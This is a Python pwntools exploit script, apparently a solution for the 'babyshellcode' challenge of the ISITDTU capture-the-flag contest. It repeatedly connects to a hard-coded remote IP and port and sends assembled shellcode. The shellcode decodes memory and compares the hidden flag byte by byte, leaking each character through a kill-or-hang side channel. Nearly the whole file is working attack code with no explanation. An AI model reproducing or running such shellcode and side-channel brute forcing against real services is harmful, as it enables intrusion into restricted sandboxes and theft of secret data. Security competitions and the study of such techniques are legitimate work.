from pwn import *
from pwn_debug.pwn_debug import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = "babyshellcode"
# LIBC = "/lib/x86_64-linux-gnu/libc-2.29.so"
LIBC = "/usr/local/lib/libseccomp.so.0"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = '209.97.162.170'
PORT = 2222

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
# r = remote(HOST, PORT)

# bp, fork-mode, command
# pdbg.bp([0xd3c], 'child', ['c'])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

ans = 'ISITDTU{'
for i in range(8, 0x30):
    for j in range(0x20, 0x7f): 
        # r = process(TARGET)
        r = remote(HOST, PORT)

        s = '''
mov    rsi,0xcafe000
movabs rbx,0x7b55544454495349 
xor    rbx,QWORD PTR [rsi]
xor    QWORD PTR [rsi+''' + str((i//8)*8) + '''],rbx

mov    rax,''' + str(j) + '''
cmp    BYTE PTR [rsi+''' + str(i) + '''],al
jnz    set
loop:
jmp loop

set:
mov    rax,0x25
mov    rdi,1
syscall
jmp loop
        '''
        assert len(s) > 0x46
        payload = asm(s) 
        print "trying: ", i, "th word:", j, chr(j)
        # print s
        # print payload
        r.sendline(payload) 
        if "Killed" in r.recv():
            ans += chr(j)
            break
        r.close()
    print ans



r.interactive()
